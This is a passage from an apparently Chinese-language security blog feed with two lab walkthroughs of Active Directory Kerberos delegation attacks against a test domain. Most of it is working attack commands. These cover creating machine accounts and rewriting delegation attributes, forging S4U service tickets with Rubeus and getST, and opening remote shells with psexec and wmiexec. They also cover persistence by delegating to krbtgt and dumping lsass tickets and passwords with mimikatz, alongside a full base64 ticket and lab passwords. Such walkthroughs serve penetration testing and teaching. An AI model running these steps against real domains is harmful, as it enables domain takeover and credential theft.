-MachineAccount test2023 -Password $(ConvertTo-SecureString "xxxxxx" -AsPlainText -Force) -Verbose &#125;'</span></span><br><span class="line"></span><br><span class="line">test2023/ASD123=</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询新建机器的SID</span></span><br><span class="line">.\SharpView.exe <span class="built_in">Get-DomainComputer</span> <span class="literal">-Identity</span> test2023 <span class="literal">-Properties</span> objectsid,name,distinguishedname</span><br></pre></td></tr></table></figure><p><img src="/8.png" alt="image.png"><br/><br><img src="/9.png" alt="image.png"><br><a name="ztBtu"></a></p><h3 id="2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性"><a href="#2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性" class="headerlink" title="2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性"></a>2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性</h3><p><a name="MTmkW"></a></p><h4 id="win-server-2012以下："><a href="#win-server-2012以下：" class="headerlink" title="win server 2012以下："></a>win server 2012以下：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1255055821-1061842389-129624233-1118)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> web<span class="literal">-2012</span>| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">实战中一句话执行</span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"Import-Module .\powerview.ps1;<span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"</span>O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-4223269421</span><span class="literal">-3390898629</span><span class="literal">-3395902804</span><span class="literal">-1119</span>)\<span class="string">";<span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);<span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);Get-DomainComputer WIN-SKE-PC | Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=<span class="variable">$SDBytes</span>&#125; -Verbose"</span></span><br></pre></td></tr></table></figure><p><a name="uEodQ"></a></p><h4 id="win-server-2012以上："><a href="#win-server-2012以上：" class="headerlink" title="win server 2012以上："></a>win server 2012以上：</h4><p>ActiveDirectory修改</p><blockquote><p>Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项</p></blockquote><p>ActiveDirectory模块默认只在域控上安装，如果不是域控可以从域控上把DLL文件复制出来，然后导入即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br><span class="line">Set-ADComputer web-<span class="number">2012</span> -PrincipalsAllowedToDelegateToAccount test2023$</span><br><span class="line">Get-ADComputer web-<span class="number">2012</span> -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure><p><a name="Ptx4I"></a></p><h4 id="工具利用："><a href="#工具利用：" class="headerlink" title="工具利用："></a>工具利用：</h4><p><a name="JwmCs"></a></p><h5 id="SharpAllowedToAct-Modify"><a href="#SharpAllowedToAct-Modify" class="headerlink" title="SharpAllowedToAct-Modify"></a>SharpAllowedToAct-Modify</h5><p>域账户必须要是将攻击的机器加入域的账户，否则没有权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-m</span>参数为你添加的机器账号，<span class="literal">-u</span>为ldap账号，<span class="literal">-p</span>为ldap密码，<span class="literal">-t</span>为准备要攻击的机器名，<span class="literal">-a</span>为域控地址，<span class="literal">-d</span>为域名，如：</span><br><span class="line">.\SharpAllowedToAct.exe <span class="literal">-m</span> test2023 <span class="literal">-u</span> susan <span class="literal">-p</span> asd123= <span class="literal">-t</span> web<span class="literal">-2012</span> <span class="literal">-a</span> AD01<span class="literal">-2016</span>.redteam.com <span class="literal">-d</span> redteam.com</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查询是否修改成功</span></span><br><span class="line">.\SharpView.exe <span class="built_in">Get-DomainComputer</span> <span class="literal">-Identity</span> web<span class="literal">-2012</span> <span class="literal">-Properties</span> msds<span class="literal">-allowedtoactonbehalfofotheridentity</span></span><br></pre></td></tr></table></figure><p><img src="/10.png" alt="image.png"><br /><img src="/11.png" alt="image.png"><br><a name="wQvaw"></a></p><h4 id="清除msds-allowedtoactonbehalfofotheridentity属性"><a href="#清除msds-allowedtoactonbehalfofotheridentity属性" class="headerlink" title="清除msds-allowedtoactonbehalfofotheridentity属性"></a>清除msds-allowedtoactonbehalfofotheridentity属性</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sharpview.exe <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> web<span class="literal">-2012</span> <span class="literal">-Clear</span> <span class="string">'msds-allowedtoactonbehalfofotheridentity'</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><p><a name="WZ3On"></a></p><h3 id="3、攻击思路"><a href="#3、攻击思路" class="headerlink" title="3、攻击思路"></a>3、攻击思路</h3><p><a name="Amzz0"></a></p><h4 id="方法1：Rubeus-伪造票据"><a href="#方法1：Rubeus-伪造票据" class="headerlink" title="方法1：Rubeus | 伪造票据"></a>方法1：Rubeus | 伪造票据</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建的机器账户</span></span><br><span class="line">.\Rubeus.exe hash /user:test2023<span class="variable">$</span> /password:ASD123= /domain:redteam.com</span><br><span class="line"></span><br><span class="line">伪造票据</span><br><span class="line">.\Rubeus.exe s4u /user:test2023<span class="variable">$</span> /rc4:C680D6B43E9E004BA4680722D78E1405 /impersonateuser:administrator /msdsspn:cifs/web<span class="literal">-2012</span>.redteam.com /ptt</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe s4u /user:test2023<span class="variable">$</span> /rc4:C680D6B43E9E004BA4680722D78E1405 /impersonateuser:administrator /msdsspn:cifs/web<span class="literal">-2012</span>.redteam.com /ptt</span><br></pre></td></tr></table></figure><p><img src="/12.png" alt="image.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 导入票据</span></span><br><span class="line">.\Rubeus.exe ptt /ticket:doIGLDCCBiigAwIBBaEDAgEWooIFODCCBTRhggUwMIIFLKADAgEFoQ0bC1JFRFRFQU0uQ09NoicwJaADAgECoR4wHBsEY2lmcxsUd2ViLTIwMTIucmVkdGVhbS5jb22jggTrMIIE56ADAgESoQMCAQGiggTZBIIE1QUWuyqH4MPNeSvepiMjZ8Cmqea+OSBW81e4d02/YhP4q7TJKl3qNtF0NAsgc42wAAtvUXXie8QVMXUvhQ0PfCh1alkAcrK4tyZyl6yhf4fq+PEkgn96+ibqsNDol+<span class="number">5</span>Y1CVjjDLwQQ9svaSJSLnHK3BDZ03aYSVNZn5QxuNIQc9nsFZ5g/rrXAaOLelwGYHyZHCONYaxxzrxN50OWaOSg9Cj4UKTFo4c1BpQs15NeknCQ2Rf8oLkCGOET6F41Qqz2Q5y1vja6tQLVsthPV50jc95j3OIrY1kgoLvLjQkQGhF4KGqTcMpTg6tXelewPh85FrmZ9ww1NkSmIY6knmIrchAKLtliP2ta1OKoyXMUQid2CUpGjanO508S1ouQNLJABdFd1tOqISru/P5jsPuTAcMIU807+<span class="number">8</span>l9JwBUy/nukF79bgDOXoZ92V/LyGZPoQGS870Hriauiis4OcHzYUTApb3P+KvgnUpa1NYS9xq2dtnYYWj+YSM4kDXA8m8KuXD2PunSEK6Ujw4E/<span class="number">8</span>ALq3ggIQC79ScfMZfpOagEJ9zktvzd/<span class="number">1</span>U8FBHQ3nGDOBoYgQ7F8pFVN8eFQYeFm0mbRfuuGwSLUssdZpENqxYRA4HRz74B5FK8uKXcunOZgkhjc8UJVakN4Xntj8fYDN6YNoNZMpypw2N0n8YJUxtcl/xjJ3M2On1YJZSIxQnRRNygJaWP1qI0GsCAy2YOe6IcDDuX8aAUbYcKNCGw6GUoph0rHU6HqzvkTub1p3GEOYOAXj/QID77jUc9bf1Fxcpn/bF4uWs9ORbf3XYdkGhvT3K/pZGIXBnz3JXMXJKaG55SdsB7Jy+cZylt9HRzqgzrrLGKANOSxpb1GabfMgJyhdsxLFP6HQi40wySmXi8Ct0Xh+xtwx4OjUnjyUNNapVffOKKlR3mo417AR0wq6dAipz1akKlCH/n0QB/<span class="number">2</span>G4TLUY++<span class="number">6</span>b4t/cMJxlOBGPGnvf8IX3qzfTkH3pjUCAA/r/l1npVw4ZpVy7760Zibw04j/mpZrC3TdZeLO2sykyLHfeEBt19AbWwDB5HPzzKdonMwBYxceHJ1LPcQe24zuL94GKFAJiSMeY3yBW0zWrbXXjnprhLiJpuBmbmQP2YlfoScNfEnVpYrE/G/hq2ThYZx+gorfC5AfRym0cSiiV7W8sC5c3tIwbUvB94vxa62gyuhSVQols3ApPLXIFDwOGfQgN1NovZbZsy5WuQPHZS78Zkww4fH2t479H+NFymOWTtmJ+jfrFv/<span class="number">4</span>BmlbqfNV9GU/kldcHbJZ3JcJ1Sw7W8CVmRPTI+<span class="number">8</span>p0t7UA/vtgPQ+eNJdzvXbfprHbuvIaJkOACGycIHvXH1hmx7GS6OGA9LhO5mDQOlNPLWY/RaAlSKbS7defK6fq6GmxeQ+<span class="number">79</span>o/N8pcUrKYv/+<span class="number">3</span>yplh8WYmmB4vJ0Tw1fJyMtDziZJjNafLrXR5vFE8QBawk3ad/zzwl3KF1GcTayHZdOqss5q5xdVNDeBvEbKwOx3VCngGpDVn4K+lZCDfJHjPIHKGb2rlzTpM2IYAawes8ky+rxT2pU0vzZqZ2ufx0RUsLMY0z3Me6+bPb0ICNqr2OiZ+cKATftEV11SQ+HARNtn2Ib+U5MWUP0lb+e5x2XujIxLlQJpO5V+MebxE7jhGO2+Kjgd8wgdygAwIBAKKB1ASB0X2BzjCBy6CByDCBxTCBwqAbMBmgAwIBEaESBBDtXpcKsREXIe0ePGCBEjlFoQ0bC1JFRFRFQU0uQ09NohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDIzMDIxMzEwNDM0MFqmERgPMjAyMzAyMTMyMDQzMzlapxEYDzIwMjMwMjIwMTA0MzM5WqgNGwtSRURURUFNLkNPTaknMCWgAwIBAqEeMBwbBGNpZnMbFHdlYi0yMDEyLnJlZHRlYW0uY29t</span><br></pre></td></tr></table></figure><p><img src="/13.png" alt="image.png"><br />尝试连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir \\web<span class="literal">-2012</span>.redteam.com\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Psexec连接速度会特别慢不知道为什么，得等很久</span></span><br><span class="line">.\Psexec.exe <span class="literal">-accepteula</span> \\web<span class="literal">-2012</span>.redteam.com cmd</span><br></pre></td></tr></table></figure><p><img src="/14.png" alt="image.png"><br /><img src="/15.png" alt="image.png"><br><a name="oSZnT"></a></p><h4 id="方法2：getST-伪造票据"><a href="#方法2：getST-伪造票据" class="headerlink" title="方法2：getST | 伪造票据"></a>方法2：getST | 伪造票据</h4><p>伪造票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\getST.exe <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">10.10</span> redteam.com/test2023<span class="variable">$</span>:ASD123= <span class="literal">-spn</span> cifs/web<span class="literal">-2012</span>.redteam.com <span class="literal">-impersonate</span> administrator</span><br></pre></td></tr></table></figure><p><img src="/16.png" alt="image.png"><br />设置票据，连接机器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## cmd</span></span><br><span class="line">set KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">.\psexec.exe <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">10.10</span> web<span class="literal">-2012</span>.redteam.com <span class="literal">-no</span><span class="literal">-pass</span> <span class="literal">-k</span> <span class="literal">-codec</span> gbk</span><br><span class="line">.\wmiexec.exe <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">10.10</span> web<span class="literal">-2012</span>.redteam.com <span class="literal">-no</span><span class="literal">-pass</span> <span class="literal">-k</span> <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure><p><img src="/17.png" alt="image.png"><br />或者将ccache文件转换为kirbi文件导入，建立ipc连接</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kekeo<span class="selector-class">.exe</span> <span class="string">"kerberos::ptt administrator@redteam.com_cifs~web-2012.redteam.com@REDTEAM.COM.kirbis"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line">dir \\web-<span class="number">2012</span><span class="selector-class">.redteam</span>.com\c$</span><br><span class="line"></span><br><span class="line">.\Psexec<span class="selector-class">.exe</span> \\web-<span class="number">2012</span><span class="selector-class">.redteam</span><span class="selector-class">.com</span> cmd</span><br></pre></td></tr></table></figure><p><img src="/18.png" alt="image.png"><br><a name="pp5pg"></a></p><h4 id="后利用方法3：域管权限，权限维持打造黄金票据"><a href="#后利用方法3：域管权限，权限维持打造黄金票据" class="headerlink" title="后利用方法3：域管权限，权限维持打造黄金票据"></a>后利用方法3：域管权限，权限维持打造黄金票据</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">## 创建委派机器账户</span><br><span class="line">powershell -exec bypass  '&amp;&#123;import-module .\Powermad.ps1; New-MachineAccount -MachineAccount administrator2 -Password $(ConvertTo-SecureString <span class="string">"asd123456="</span> -AsPlainText -Force) -<span class="keyword">Verbose</span> &#125;'</span><br><span class="line"></span><br><span class="line">## 给krbtgt创建委派权限</span><br><span class="line"><span class="keyword">Set</span>-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount administrator2$</span><br><span class="line"><span class="keyword">Get</span>-ADUser krbtgt -<span class="keyword">Properties</span> PrincipalsAllowedToDelegateToAccount</span><br><span class="line"></span><br><span class="line">.\sharpview.exe <span class="keyword">Set</span>-DomainObject -<span class="keyword">Identity</span> krbtgt -<span class="keyword">Clear</span> 'PrincipalsAllowedToDelegateToAccount' -<span class="keyword">Verbose</span></span><br></pre></td></tr></table></figure><p><img src="/19.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 申请票据</span></span><br><span class="line"><span class="string">.\getST.exe</span> <span class="string">redteam.com/administrator2$:asd123456=</span> <span class="string">-spn</span> <span class="string">krbtgt</span> <span class="string">-impersonate</span> <span class="string">administrator</span> <span class="string">-dc-ip</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入票据</span></span><br><span class="line"><span class="string">set</span> <span class="string">KRB5CCNAME=administrator.ccache</span></span><br><span class="line"></span><br><span class="line"><span class="string">.\psexec.exe</span> <span class="string">-dc-ip</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> <span class="string">ad01-2016.redteam.com</span> <span class="string">-no-pass</span> <span class="string">-k</span> <span class="string">-codec</span> <span class="string">gbk</span></span><br></pre></td></tr></table></figure><p><img src="/20.png" alt="image.png"><br><a name="bIg9a"></a></p><h4 id="方法4：敏感账户不可委派绕过"><a href="#方法4：敏感账户不可委派绕过" class="headerlink" title="方法4：敏感账户不可委派绕过"></a>方法4：敏感账户不可委派绕过</h4><p><a href="https://xz.aliyun.com/t/7454#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454#toc-2</a><br><a name="pp0wY"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/xmtblog/article/details/45866199" target="_blank" rel="noopener">AD域中常见属性名词解释</a><br /><a href="https://nosec.org/home/detail/4352.html" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a><br /><a href="https://cloud.tencent.com/developer/article/1552171" target="_blank" rel="noopener">利用资源约束委派进行的提权攻击分析</a><br /><a href="https://www.cnblogs.com/zpchcbd/p/12963328.html" target="_blank" rel="noopener">基于资源的约束委派攻击</a><br /><a href="https://xz.aliyun.com/t/11555" target="_blank" rel="noopener">域渗透之委派攻击全集</a><br /><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653579473&idx=1&sn=89d630a4d0f48bc0dcd98f8d6c976fd4&chksm=811b7e93b66cf785d8ff3ae3ab782dd91ca9d38eb8dbec9af1d1a3eb75c0aac93ff0dfd29f68&scene=126&sessionid=1657518547&key=10cf53547534d2b5d5442373f9acc6bc5917447120253175277b7d1439fecfaf12d0c375d91e35bca61109d88b5b7922993a08b6d86269e06a5cead619ae9dcbc34ad5aab0008ba50fabc27c510953cd50396df08079c8dfed604335dde9e4e6f6ec96262709864eb85ff38b1c3979385d93aeb695431b15071cb34bbc0116a3&ascene=15&uin=MTA3Mzc3OTIzNQ==&devicetype=Windows+Server+2016+x64&version=6307001e&lang=zh_CN&session_us=gh_ceb74c1acd23&exportkey=AWBHzQsIMK/GwXyn+bSbUAM=&acctmode=0&pass_ticket=jIK6vhF3mCQF690Iyuj5FSKbNmzYaIBgJZiGIoQCvwVOWNxsOgE4JsPo3XNpeRGw&wx_header=0&fontgear=2" target="_blank" rel="noopener">内网渗透 域ACL攻防</a></p>]]></content>
      
      
      <categories>
          
          <category> 委派 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约束性委派利用</title>
      <link href="/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/"/>
      <url>/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议<code>S4u2self（Service for User to Self）</code>和<code>S4U2proxy（Service for User to Proxy）</code>。<br>约束委派有两种：</p><blockquote><ol><li>仅使用Kerberos，不能进行协议转换</li><li>使用任何身份验证协议</li></ol></blockquote><a id="more"></a><h3 id="S4u2self-S4U2proxy"><a href="#S4u2self-S4U2proxy" class="headerlink" title="S4u2self &amp; S4U2proxy"></a>S4u2self &amp; S4U2proxy</h3><p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据；<br><code>S4U2proxy</code>协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据；<br>    约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务。<br>配置了约束性委派的账户属性会有如下两个变化：</p><blockquote><ol><li>账户<code>userAccountControl</code>属性设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>标志位，值<code>16781312</code>。</li><li>账户<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务。</li></ol></blockquote><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">域名: redteam.com</span><br><span class="line">域控: </span><br><span class="line">    操作系统: Windows<span class="built_in"> Server </span>2016</span><br><span class="line">主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.10</span><br><span class="line"></span><br><span class="line">    主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.11</span><br><span class="line">域内主机:</span><br><span class="line">    操作系统: Windows<span class="built_in"> server </span>2012</span><br><span class="line">    主机名: web-2012</span><br><span class="line">    IP: 10.10.10.12</span><br><span class="line">攻击机:</span><br><span class="line">    操作系统: win 10</span><br><span class="line">    IP: 10.10.10.22</span><br></pre></td></tr></table></figure><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p><strong>机器账户</strong><br>活动目录中的computers组内的计算机，也被称为机器账号。<br><strong>服务账户</strong><br>域账户注册SPN成为服务账户</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red saulgoodman #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red web<span class="number">-2012</span> #web<span class="number">-2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web<span class="number">-2012.</span>redteam.red</span><br></pre></td></tr></table></figure><p>域账户变成服务账户后会有委派，仅信任此用户作为指定服务的委派 -&gt; 添加想要委派的服务。</p><p><img src="/1.png" alt="image.png"></p><h2 id="约束委派服务账户特征"><a href="#约束委派服务账户特征" class="headerlink" title="约束委派服务账户特征"></a><strong>约束委派服务账户特征</strong></h2><p> 配置了约束性委派的账户属性会有如下两个变化。<br>账户 userAccountControl 属性会被设置为TRUSTED_TO_AUTH_FOR_DELEGATION 标志位，账户 msDS-AllowedToDelegateTo 属性，添加允许委派的服务。<br><img src="/2.png" alt="image.png"></p><h2 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h2><h4 id="方法1：ADFind"><a href="#方法1：ADFind" class="headerlink" title="方法1：ADFind"></a>方法1：ADFind</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派机器账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派服务账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/3.png" alt="image.png"></p><h4 id="方法2：SharpView"><a href="#方法2：SharpView" class="headerlink" title="方法2：SharpView"></a>方法2：SharpView</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerView查询约束委派机器账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainComputer -TrustedToAuth -Doamin redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto </span>-AutoSize</span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView查询约束委派服务账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainUser –TrustedToAuth -Domain redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span></span><br></pre></td></tr></table></figure><p><img src="/4.png" alt="image.png"></p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：使用机器账户的票据-kekeo"><a href="#方法1：使用机器账户的票据-kekeo" class="headerlink" title="方法1：使用机器账户的票据 | kekeo"></a>方法1：使用机器账户的票据 | kekeo</h4><p>约束性委派攻击的关键就是<strong>获得可转发的服务票据ST</strong>，获取根据约束性委派的执行过程可知，只要<strong>控制配置约束性委派服务的机器，并获得了它的密码</strong>，那么我们就可以劫持这台主机的kerberos请求过程，最终获得任意用户权限的ticket，利用条件：</p><blockquote><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol></blockquote><p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>工具导出<code>lsass.exe</code>进程中所有的票据，得到想要的服务票据</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="/5.png" alt="image.png"></p><p>使用kekeo工具申请服务票据（S4U2Proxy协议）</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请服务票据</span></span><br><span class="line">.<span class="string">\kekeo.exe</span> <span class="string">"tgs::s4u /tgt:[0;3e7]-2-1-40e10000-web-2012$@krbtgt-REDTEAM.COM.kirbi /user:Administrator@redteam.COM /service:cifs/ad01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"kerberos::ptt TGS_Administrator@redteam.com@REDTEAM.COM_cifs~ad01-2016.redteam.com@REDTEAM.com.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir <span class="string">\\ad01-2016.redteam.com\c$</span></span><br><span class="line"></span><br><span class="line">.<span class="string">\Psexec.exe</span> -accepteula <span class="string">\\ad01-2016.redteam.red</span> cmd</span><br></pre></td></tr></table></figure><h4 id="方法2：使用机器账户的Hash值-Rubeus"><a href="#方法2：使用机器账户的Hash值-Rubeus" class="headerlink" title="方法2：使用机器账户的Hash值 | Rubeus"></a>方法2：使用机器账户的Hash值 | Rubeus</h4><p>与思路一类似，但是这里使用的是Hash值，利用条件：</p><blockquote><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol></blockquote><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 使用mimikatz获取机器账户NTLM Hash</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p>使用<a 